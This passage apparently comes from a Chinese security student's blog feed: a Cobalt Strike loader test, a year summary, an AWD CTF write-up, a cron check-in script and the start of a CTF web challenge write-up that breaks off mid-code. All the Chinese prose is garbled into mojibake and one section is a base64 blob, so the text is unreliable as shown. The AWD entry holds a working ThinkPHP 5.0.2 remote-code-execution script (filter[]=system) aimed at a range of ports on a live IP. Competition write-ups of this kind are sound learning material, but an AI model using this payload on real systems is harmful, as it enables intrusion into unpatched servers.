å°±æœ‰å¼¹è®¡ç®—å™¨çš„æ•ˆæœäº†ã€‚ï¼ˆå°æ€è€ƒï¼Œå¦‚ä½•åœ¨æ‰§è¡Œå®Œexeåè‡ªåŠ¨å…³é—­cmdé»‘æ¡†ï¼Ÿï¼‰</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="http://cdn.polowong.top/static/images/åå¼¹.gif"><h2 id="CMDä¸Šçº¿CS"><a href="#CMDä¸Šçº¿CS" class="headerlink" title="CMDä¸Šçº¿CS"></a>CMDä¸Šçº¿CS</h2><p>å«–æ¥äº†å¤§ä½¬çš„å…æ€æ–¹æ³•2333 è¯•ä¸€ä¸‹exeä¸Šçº¿cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>å°æ€è€ƒçš„ç­”æ¡ˆæ˜¯ï¼šå‘½ä»¤åè·Ÿ&amp; exit;</p><p>23333 </p><h1 id="æ‚è°ˆ"><a href="#æ‚è°ˆ" class="headerlink" title="æ‚è°ˆ"></a>æ‚è°ˆ</h1><p><img src="http://cdn.polowong.top/1635999756597dkayi5vd.png?imageslim" alt="paste image"><br>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿‘ä¸€å¹´å­¦ä¹ æ€»ç»“</title>
      <link href="2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>è™½ç„¶æ¥è§¦å®‰å…¨ä»åˆä¸­å°±ç®—å¼€å§‹äº†ï¼Œä½†å½“æ—¶ä¹Ÿä»…ä»…æ˜¯åœç•™äºæ··æ··å¨±ä¹åœˆï¼Œæ—¥ä¸€æ—¥åˆ«äººçš„webshellã€‚</p><p>å¤§ä¸€å¤§äºŒå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ è¾ƒå°‘ï¼Œå¤§äºŒå¤–å‡ºæ‰“äº†ä¸¤æ¬¡æ¯”èµ›ï¼Œæˆç»©è¾ƒå·®ï¼Œç›´æ¥ç™½ç»™ã€‚</p><p>å¤§ä¸‰å¯’å‡ç–«æƒ…åœ¨å®¶çš„æ—¶å€™ç®—æ˜¯æ­£å¼å¼€å§‹å­¦ä¹ å®‰å…¨çŸ¥è¯†ï¼Œåšæœ€ç®€å•çš„é¶åœºï¼Œåˆ·é¢˜ï¼Œå‰ä¸¤æ¬¡æ­£ç»æ‰“çš„æ¯”èµ›æ˜¯Iæ˜¥ç§‹é«˜æ ¡æŠ—ç–«å’ŒBJDCTFã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªçº ç»“çš„è¿‡ç¨‹ï¼Œå› ä¸ºåœ¨é‚£ä¸ªé˜¶æ®µæˆ‘è¿˜è¦å‡†å¤‡ä¿ç ”ï¼Œè¿˜åœ¨ä¿ç ”å’Œè€ƒç ”ä¸¤è€…ä¹‹é—´æ‘‡æ‘†ã€‚</p><p>æœ€ç»ˆä¸‹å®šå†³å¿ƒå†²ä¸€å†²ï¼Œé‚£æ˜¯ä¸‰æœˆåº•ã€‚æŸå…¬ä¼—å·é¢„æµ‹æˆ‘ä¿ç ”æˆåŠŸç‡åœ¨30%å·¦å³ã€‚</p><p>å…·ä½“å­¦ä»€ä¹ˆçŸ¥è¯†åœ¨è¿™é‡Œä¹Ÿä¸æƒ³è¯´äº†ï¼Œç®—æ˜¯ä»æœ€åŸºç¡€çš„å¼€å§‹å­¦ä¹ å§ï¼Œå°è±¡æ¯”è¾ƒæ·±çš„æ˜¯LFIã€‚ç°åœ¨æˆ‘XSSå’Œæ³¨å…¥ç©çš„ä¹Ÿä¸å¥½ï¼Œç®—æ˜¯åªä¼šç”¨å·¥å…·è·‘è·‘ã€‚</p><p>ä¿å®Œç ”ä¹‹åæœ‰äº›è®¸æ¾æ‡ˆï¼Œå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ æœ‰äº›æ‡ˆæ€ äº†ï¼ŒSRCè¿˜æ²¡å¼€å§‹æï¼Œåˆ°ç°åœ¨ä¸Šç­æ—¶é—´ä¹Ÿä¸å¤ªå……è£•ã€‚</p><p>ç°åœ¨æ­£å¥½æ˜¯ä¸‰æœˆåˆï¼Œè·ç¦»æˆ‘å¼€å§‹æ­£å¼æ¥è§¦å®‰å…¨ä¹Ÿå·®ä¸å¤šä¸€å¹´çš„æ—¶é—´ï¼Œåœ¨è¿™ä¸€å¹´é‡Œï¼Œæˆ‘åšåˆ°äº†ï¼š</p><p>1.ä¸¤ä»½æ¸—é€å²—å®ä¹ ç»å†</p><p>2.ä¸¤æ¬¡é€šè¿‡æŠ¤ç½‘é¢è¯•ï¼Œä¸€æ¬¡ä¸­çº§ï¼Œä¸€æ¬¡åˆçº§ã€‚ï¼ˆè“é˜Ÿ</p><p>3.æ‹¿åˆ°äº”æ‰€985ç½‘ç»œå®‰å…¨ä¸“ä¸šOFFER,å…¶ä¸­å››ä¸ªå­¦ç¡•;</p><p>4.æ•°æ¬¡å‚åŠ çº¿ä¸Šèµ›ï¼Œè™½ç„¶ç™½ç»™çš„è¾ƒå¤š</p><p>5.ä¸¤æ¬¡å¸¦é˜Ÿå‚åŠ çœèµ›</p><p>6.å¼€å§‹æ‰“AWD</p><p>7.ç‹¬ç«‹å‘è¡¨ä¸€ç¯‡è®ºæ–‡</p><p>8.ç‹¬ç«‹å®Œæˆä¸¤ä¸ªå°é¡¹ç›®</p><p>9.ç¾èµ›å»ºæ¨¡ä¸€ç­‰å¥–</p><p>10.è‡ªè´¹MacBook Pro</p><p>11.ç»æµç‹¬ç«‹</p><p>12.é¡ºåˆ©ä¿ç ”</p><p>ä¸‹ä¸€å¹´æ¸´æœ›æ›´å¥åº·çš„èº«ä½“ä¸ç›¸å¯¹åšå¼ºçš„æ„å¿—ï¼Œè‡³å°‘ä¸èƒ½ä¸­åˆä¸€è§‰ç¡ä¸‰ä¸ªå°æ—¶ã€‚</p><p>ä»…æ­¤è®°å½•</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡çº¿ä¸ŠAWD</title>
      <link href="2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
      <url>2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æ‰“äº†ä¸€æ¬¡çº¿ä¸ŠAWDï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ‰“AWD,è¡¨ç°ä¸å¤ªå¥½ï¼Œå‰æœŸçœ‹äº†ä¸€äº›AWDçš„æ€è·¯å’Œå¥—è·¯ï¼Œä½†æ˜¯æ²¡æœ‰çœŸæ­£åº”ç”¨äºå®é™…çš„AWDç¯å¢ƒä¸­ï¼Œéšåšä¸€æ¬¡è®°å½•ï¼Œè®°å½•è¿™é‡Œé¢å­˜åœ¨çš„é—®é¢˜ä»¥åŠæ²¡åšå¥½çš„åœ°æ–¹ã€‚</p><h1 id="å¼€èµ›"><a href="#å¼€èµ›" class="headerlink" title="å¼€èµ›"></a>å¼€èµ›</h1><p>å¼€å±€ç»™äº†sshå’ŒwebæœåŠ¡ä»¥åŠè¦æ±‚ï¼Œå¦‚æœè¢«check downäº†ï¼Œæ¯è½®æ‰£100åˆ†ï¼ˆå½“æ—¶ä¸çŸ¥é“æ¯è½®æ‰£100åˆ†ï¼Œä»¥ä¸ºä¸€å…±æ‰£100ï¼Œæ¯æ¬¡restartéœ€è¦æ‰£100å¹¶ä¸”é‡ç½®ç¯å¢ƒï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡restartï¼‰</p><h1 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h1><p>æ‹¿åˆ°sshæƒé™åé¦–å…ˆå¤‡ä»½äº†æ–‡ä»¶ï¼Œç”¨Dç›¾ã€æ²³é©¬webshellä¸“æ€å·¥å…·å¯¹webç¯å¢ƒè¿›è¡Œæ€æ¯’ï¼Œæƒ³æŸ¥æ€webshellã€‚</p><p>åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­ï¼Œä½¿ç”¨æ²³é©¬webshellä¸“æ€å·¥å…·å’ŒDç›¾æ€äº†ä¸€ä¸ªshellï¼Œä½†æ˜¯æœ‰å…æ€shellæ²¡æ€å‡ºæ¥ï¼ˆä¸€èˆ¬AWDä¼šå†…ç½®å¤šä¸ªåé—¨ï¼‰ï¼Œç”±äºæ—¶é—´åŸå› ä¹Ÿæ²¡æœ‰ç»†çœ‹ï¼Œé€ æˆçš„åæœæ˜¯è¢«ä¼ äº†ä¸æ­»é©¬ã€‚ï¼ˆè¿™æ˜¯åè¯äº†ã€‚</p><p>åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­åº”æ”¹è¿›çš„åœ°æ–¹æ˜¯ï¼š</p><p>1.é‡‡ç”¨å¤šç§å·¥å…·ç»¼åˆæŸ¥æ€webshell</p><p>2.å¯¹ç–‘ä¼¼åé—¨æ–‡ä»¶æ‰‹å·¥æŸ¥çœ‹ï¼Œä¸èƒ½å®Œå…¨ç›¸ä¿¡å·¥å…·ã€‚</p><h3 id="å¼±ç‚¹1"><a href="#å¼±ç‚¹1" class="headerlink" title="å¼±ç‚¹1"></a>å¼±ç‚¹1</h3><p>æµé‡ç›‘æ§è„šæœ¬æ²¡æŒ‚ä¸Šå»ï¼Œå¯¼è‡´ç›‘æ§æµé‡å¤±è´¥ï¼Œæ— æ³•å¾—çŸ¥æœ‰å“ªäº›payloadæ˜¯å‘èµ·äº†æ”»å‡»ã€‚</p><h2 id="è‡ªæ£€"><a href="#è‡ªæ£€" class="headerlink" title="è‡ªæ£€"></a>è‡ªæ£€</h2><p>é€šè¿‡è§‚å¯ŸwebæœåŠ¡ä»¥åŠæŠ¥é”™é¡µé¢ï¼Œå‡ºç°äº†ç»å…¸çš„åå¹´ç£¨ä¸€å‰‘â€”-TP5.0.2ï¼Œäºæ˜¯ç«‹åˆ»æƒ³åˆ°äº†TP5.0.2çš„RCEã€‚</p><p>ç½‘ä¸Šæ”¶é›†payloadåæ‰“äº†ä¸€æ³¢cat/flagï¼ŒæˆåŠŸï¼Œå¹¶ä¸”é€šè¿‡è¯¥æ–¹å¼æ‹¿åˆ°äº†å…¶ä»–é˜Ÿä¼çš„flagï¼Œé‚è€ƒè™‘é‡‡ç”¨è„šæœ¬ç¼–å†™EXPæ‰¹é‡getflagå¹¶é€šçŸ¥è´Ÿè´£é˜²æŠ¤çš„é˜Ÿå‘˜ä¿®å¤ç›¸å…³æ¼æ´ã€‚</p><h3 id="å¼±ç‚¹2"><a href="#å¼±ç‚¹2" class="headerlink" title="å¼±ç‚¹2"></a>å¼±ç‚¹2</h3><p>åœ¨ä¿®å¤æ—¶æµªè´¹äº†å¤ªå¤šçš„æ—¶é—´ï¼Œè´Ÿè´£ä¿®å¤çš„é˜Ÿå‘˜æ— æ³•å°½å¿«ä¿®å¤ï¼Œå¹¶åœ¨ä¸Šä¼ ä¿®å¤åçš„æ–‡ä»¶æ—¶é‡åˆ°äº†æƒé™é—®é¢˜ã€‚</p><h3 id="å¼±ç‚¹3"><a href="#å¼±ç‚¹3" class="headerlink" title="å¼±ç‚¹3"></a>å¼±ç‚¹3</h3><p>ä¸´åœºç´§å¼ +payloadä¸ç†Ÿæ‚‰</p><p>æˆ‘çœŸçš„åäº†ã€‚å½“æ—¶å¤ªç´§å¼ äº†ï¼Œä¹‹å‰åˆ©ç”¨TP5çš„payloadä¹Ÿæ˜¯å¤åˆ¶ç²˜è´´ï¼Œè¿™ä¸¤ä¸ªå› ç´ åŠ èµ·æ¥å¯¼è‡´æˆ‘åœ¨Hackbarèƒ½é¡ºåˆ©æ‰“payloadï¼ŒBurpä¹Ÿå¯ä»¥ï¼Œä½†åˆ°äº†å†™è„šæœ¬çš„æ—¶å€™å°±ä¸è¡Œã€‚å› ä¸ºpayloadæ˜¯å››ä¸ªé”®å€¼å¯¹ï¼Œæˆ‘å†™è„šæœ¬çš„æ—¶å€™åªå†™äº†ä¸€ä¸ªã€‚</p><p>è´´ä¸€ä¸‹æˆ‘å½“æ—¶å†™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h1><p>åœ¨æ‹¿åˆ°ä¸€ä¸ªå¹¶ä¸”å”¯ä¸€ä¸€ä¸ªpayloadåï¼Œç”±äºæ²¡æœ‰ç¼–å†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œé‚è€ƒè™‘æ‰‹åŠ¨æ‰“ï¼Œå¯¼è‡´çš„å¾—åˆ†ç¼“æ…¢ã€‚</p><h3 id="å¼±ç‚¹4"><a href="#å¼±ç‚¹4" class="headerlink" title="å¼±ç‚¹4"></a>å¼±ç‚¹4</h3><p>ä¸´åœºè„šæœ¬ç¼–å†™èƒ½åŠ›æ¬ ç¼º</p><p>åœ¨ç¼–å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ç”¨åˆ°å¯¹htmlæ ‡ç­¾è§£æçš„åº“ï¼ˆå«å•¥å¿˜äº†ï¼‰ã€å¤šçº¿ç¨‹ï¼ˆæ‰¹é‡getflagå’Œæäº¤flagï¼‰ï¼Œä½†ç”±äºå¾ˆä¹…æ²¡å†™å¤šçº¿ç¨‹äº†ï¼Œæ‰€ä»¥å¿˜äº†å¤šçº¿ç¨‹å’‹ç”¨äº†ã€‚ã€‚è€Œä¸”è§£æhtmlæ ‡ç­¾è¿˜æ˜¯å¤§äºŒå­¦çˆ¬è™«çš„æ—¶å€™å†™çš„ï¼Œå¤ªè¿‡ä¹…è¿œï¼Œä¹Ÿæå¿˜è®°äº†ã€‚æ‰€ä»¥æœ€åè„šæœ¬ä¹Ÿæ²¡è·‘èµ·æ¥ï¼Œè€½è¯¯äº†å¤ªå¤šæ—¶é—´ã€‚</p><h3 id="å¼±ç‚¹5"><a href="#å¼±ç‚¹5" class="headerlink" title="å¼±ç‚¹5"></a>å¼±ç‚¹5</h3><p>å¯¹AWDèµ›åˆ¶ä¸ç†Ÿæ‚‰ï¼Œæœºå™¨è‡³å°‘downäº†ä¸‰åˆ†ä¹‹ä¸€çš„æ¯”èµ›æ—¶é—´ï¼Œ5åˆ†é’Ÿä¸€è½®ï¼Œä¸€è½®æ‰100åˆ†ã€‚æˆ‘è¯´æ€ä¹ˆè¶Šäº¤flagåˆ†è¶Šå°‘ã€‚ã€‚ç»äº†ã€‚</p><h1 id="åæ€ä¸æ”¹è¿›"><a href="#åæ€ä¸æ”¹è¿›" class="headerlink" title="åæ€ä¸æ”¹è¿›"></a>åæ€ä¸æ”¹è¿›</h1><h2 id="æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›"><a href="#æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›" class="headerlink" title="æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›"></a>æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›</h2><p>ä¸è¯´äº†ã€‚å¤šå†™å¤šçœ‹å¤šå¯»æ€ å¤šå€Ÿé‰´åˆ«äººçš„æ€è·¯ï¼ŒæŒæ¡åŸºæœ¬åº“çš„ç”¨æ³•ã€‚</p><p><strong>å…ˆæŠŠå¤šçº¿ç¨‹å’Œxpathè§£æå­¦ä¼šäº†ï¼ï¼ï¼</strong></p><h2 id="æå‡payloadç†Ÿç»ƒåº¦"><a href="#æå‡payloadç†Ÿç»ƒåº¦" class="headerlink" title="æå‡payloadç†Ÿç»ƒåº¦"></a>æå‡payloadç†Ÿç»ƒåº¦</h2><p>è¦æ±‚å¹³æ—¶å¤ç°è¿‡ç¨‹ä¸­ä¸èƒ½æ‹¿åˆ°ç›´æ¥æ‰“ï¼Œè¦åˆ†æåŸç†ä¸åˆ©ç”¨é“¾ã€‚</p><h2 id="æå‡è¿ç»´æ°´å¹³"><a href="#æå‡è¿ç»´æ°´å¹³" class="headerlink" title="æå‡è¿ç»´æ°´å¹³"></a>æå‡è¿ç»´æ°´å¹³</h2><p>èµ›å‰çœ‹åˆ°äº†å®‰æ’ä½æƒé™EDRï¼Œä½†æ˜¯éƒ¨ç½²èµ·æ¥çœ‹èµ·æ¥éº»çƒ¦ï¼Œå°±æ²¡æï¼Œä½†æ˜¯æµé‡ç›‘æ§è„šæœ¬ä¹Ÿæ²¡æŒ‚ä¸Šå»ï¼Œä»¥åéœ€è¦æå‰éƒ¨ç½²å¹¶å®è·µç›¸å…³è„šæœ¬ä¸ç¯å¢ƒã€‚</p><p>æ§åˆ¶å¥½ç›¸å…³æ–‡ä»¶çš„è¯»å†™æƒé™ç­‰ã€‚</p><h2 id="æå‡åº”æ€¥ååº”èƒ½åŠ›"><a href="#æå‡åº”æ€¥ååº”èƒ½åŠ›" class="headerlink" title="æå‡åº”æ€¥ååº”èƒ½åŠ›"></a>æå‡åº”æ€¥ååº”èƒ½åŠ›</h2><p>è¦é€šè¿‡æµé‡è„šæœ¬è§‚å¯Ÿæ˜¯å¦æœ‰å…¥ä¾µä¸æŒ‚é©¬è¡Œä¸ºï¼Œå­¦ä¼šå¦‚ä½•å¤„ç†ä¸æ­»é©¬ç­‰ç´§æ€¥æƒ…å†µã€‚</p><h2 id="æå‡ååˆ¶èƒ½åŠ›"><a href="#æå‡ååˆ¶èƒ½åŠ›" class="headerlink" title="æå‡ååˆ¶èƒ½åŠ›"></a>æå‡ååˆ¶èƒ½åŠ›</h2><p>è¦èƒ½é€šè¿‡åˆ«äººæ‰“çš„payloadåæ‰“åˆ«äºº</p><h2 id="å®Œå–„æ­¦å™¨åº“"><a href="#å®Œå–„æ­¦å™¨åº“" class="headerlink" title="å®Œå–„æ­¦å™¨åº“"></a>å®Œå–„æ­¦å™¨åº“</h2><p>å¤šæ”¶é›†webshellæŸ¥æ€å·¥å…·ã€ç§¯ç´¯webshellå…æ€æ–¹å¼ã€æ”¶é›†å¸¸è§æ¼æ´EXPã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°+å¾®ä¿¡æ¨é€</title>
      <link href="2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
      <url>2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</url>
      
        <content type="html"><![CDATA[<h1 id="æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°"><a href="#æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°" class="headerlink" title="æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°"></a>æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>é¦–å…ˆå®‰è£…ç¯å¢ƒä¾èµ– pip3 install requests</p><p>å°†è¯¥è„šæœ¬ä¸Šä¼ è‡³æœåŠ¡å™¨ ï¼ˆæˆ‘çš„è·¯å¾„æ˜¯/rootï¼‰</p><p>æ–°å»ºè„šæœ¬ auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>æ–°å»ºå®šæ—¶ä»»åŠ¡</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>æ¯å¤©å‡Œæ™¨0ç‚¹1åˆ†è‡ªåŠ¨æ‰§è¡Œ /root/auto.sh è¿™æ¡å‘½ä»¤</p><h1 id="ç»‘å®šserveré…±"><a href="#ç»‘å®šserveré…±" class="headerlink" title="ç»‘å®šserveré…±"></a>ç»‘å®šserveré…±</h1><p>åœ¨serveré…±ç»‘å®šå¾®ä¿¡åï¼Œæ‹¿åˆ°keyï¼Œæ”¾åˆ°ä¸‹é¢è„šæœ¬ <strong>yourkey</strong> è¿™ä¸ªåœ°æ–¹ã€‚</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h1><p>æ¯å¤©0ç‚¹1åˆ†è‡ªåŠ¨æäº¤ä½“æ¸©ä¸ŠæŠ¥è¯·æ±‚ï¼Œå¹¶ä¸”å°†è¿”å›çš„ä¿¡æ¯ï¼ˆæˆåŠŸ/é”™è¯¯ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF/*CTF web4</title>
      <link href="2021/01/18/XCTF-CTF-web4/"/>
      <url>2021/01/18/XCTF-CTF-web4/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šå‘¨æœ«åˆšç»“æŸäº†*ctfçš„æ¯”èµ›ï¼Œåˆæ‘¸é±¼äº†ã€‚ã€‚èµ›åçœ‹é›ªå®çš„wpå¤ç°å‡ºæ¥çš„ï¼Œå‘ç°æ˜¯socketå†™çš„æœ‰ç‚¹é—®é¢˜ æåˆ°å¤œé‡Œä¸‰ç‚¹ä¹Ÿæ²¡æå‡ºæ¥ wtcl</p><h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>é¢˜ç›®åˆ†æï¼š</p><p>ç›´æ¥ç»™äº†ä¸€å †docker å…ˆè·‘èµ·æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p>docker-compose up -d</p><p>è·‘èµ·æ¥äº†ä¸‰ä¸ªå®¹å™¨ åˆ†åˆ«æ˜¯ server client webserver</p><p>å…ˆæ•´ç†ä¸‹ç½‘ç»œç¯å¢ƒæƒ…å†µï¼š</p><p>webserver 172.21.0.4</p><p>server 172.21.0.2</p><p>client 172.21.0.3</p><p>é¦–å…ˆè®¿é—®webserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 